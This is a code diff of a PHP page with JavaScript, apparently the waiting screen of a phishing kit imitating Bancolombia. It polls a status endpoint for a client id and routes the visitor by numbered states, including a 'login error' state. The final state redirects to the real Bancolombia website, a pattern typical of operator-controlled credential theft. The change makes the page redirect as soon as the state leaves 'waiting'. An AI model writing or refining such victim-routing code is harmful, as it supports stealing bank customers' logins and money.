@@ -29,7 +29,6 @@ $clienteId = $_GET['id'] ?? null;
 
     <script>
         const clienteId = <?php echo json_encode($clienteId); ?>;
-        let estadoInicial = null;
 
         async function checkStatus() {
             if (!clienteId) { clearInterval(statusInterval); return; }
@@ -37,10 +36,9 @@ $clienteId = $_GET['id'] ?? null;
                 const response = await fetch("modules/api/verificar_estado.php?id=" + clienteId);
                 const data = await response.json();
                 if (data.error) { clearInterval(statusInterval); return; }
-                if (estadoInicial === null) { estadoInicial = data.estado; }
 
-                // Check for a change in status
-                if (data.estado !== estadoInicial) {
+                // Si el estado ya no es 1 (espera), redirigimos inmediatamente al estado correspondiente
+                if (data.estado != 1) {
                     clearInterval(statusInterval);
                     if (data.estado == 2) {
                         // Estado 2: Error de login
@@ -61,7 +59,7 @@ $clienteId = $_GET['id'] ?? null;
                         // Estado 7: Finalizar
                         window.location.href = `https://www.bancolombia.com/personas`;
                     } else {
-                        // Si no hay un estado definido, regresa al login por defecto.
+                        // Si no hay un estado definido, regresa al login por defecto
                         window.location.href = `index.php`;
                     }
                 }
